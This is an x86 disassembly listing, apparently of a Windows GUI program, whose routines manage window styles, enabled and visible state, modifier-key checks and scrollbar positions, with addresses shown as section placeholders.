add al [ esi ]
lodsb [ esi ]
outsb
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
cmp al 0x10
inc eax
add [ eax ] dl
cmp al [ esi ]
and al 0x3a
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax + edx ] bh
add [ ecx + rw-data ] ah
retn
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x8000408d
add [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x1
inc esi
add al dl
add [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn 0x4601
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ eax ] cl
push esp
dec ebp
outsd
outsb
arpl [ eax - 0x70 ] bp
sub [ ecx ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_460304
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_460350
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_469b30
mov eax [ rw-data ]
call sub_420fd8
mov eax [ rw-data ]
call sub_420f80
retn
push 0x0
push eax
call ShowOwnedPopups
sub_460388
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_4603d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_46047b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_460444
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_460388
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460482
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_46048c
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026ec
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_4604c4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_460528
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_4604c4
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_460584
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_4605a4
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_460584
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_4605d0
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_46706c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_467524
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407e20
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_467058
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_467510
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407e20
test eax eax
je r-xdata
sub_46066c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4606c0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4606fc
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_460768
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4607c6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45e2e8
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040a0
mov eax [ ebp - 0x8 ]
pop edx
call sub_407e20
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4607cd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
sub_4607d8
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_460800
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_460871
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4607d8
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460878
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
sub_460880
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_460910
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418d14
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_4611d8
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4611b8
mov edx [ edi + 0xc ]
mov eax ebx
call sub_461068
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_460960
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_460b18
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_449658
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_461068
xor edx edx
mov eax ebx
call sub_461068
jmp r-xdata
sub_460998
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42ba68
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_460a04
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42ba68
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_460a6c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4611a0
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44c508
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_4611a0
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44c4cc
call sub_460a04
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44c4cc
call sub_460998
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_460b18
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_44f7d8
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_460b50
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44f7d8
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_460b84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_460b50
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_460b50
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_460c00
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44f7d8
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_460b84
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4489b0
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_460b84
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4489f4
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_460c98
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44f7d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_460cf8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_460ec9 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_460c00
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_460c00
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_461068
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
push ebp
call sub_460c98
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
push ebp
call sub_460c98
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406af4
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_461068
jmp r-xdata
sub_460ff0
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4616e0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_461068
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_44f7d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_44f7d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_44f390
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_44f390
jmp r-xdata
call sub_4607d8
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_46112c
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4616e0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_4611e4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f7d8
push eax
call sub_42d87c
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f7d8
push eax
call sub_42d87c
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f7d8
push eax
call sub_42d87c
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_423dac
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f7d8
push eax
call sub_42d87c
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f7d8
push eax
call sub_42d87c
sub_4612ec
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_460c00
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_460c00
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_4611e4
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
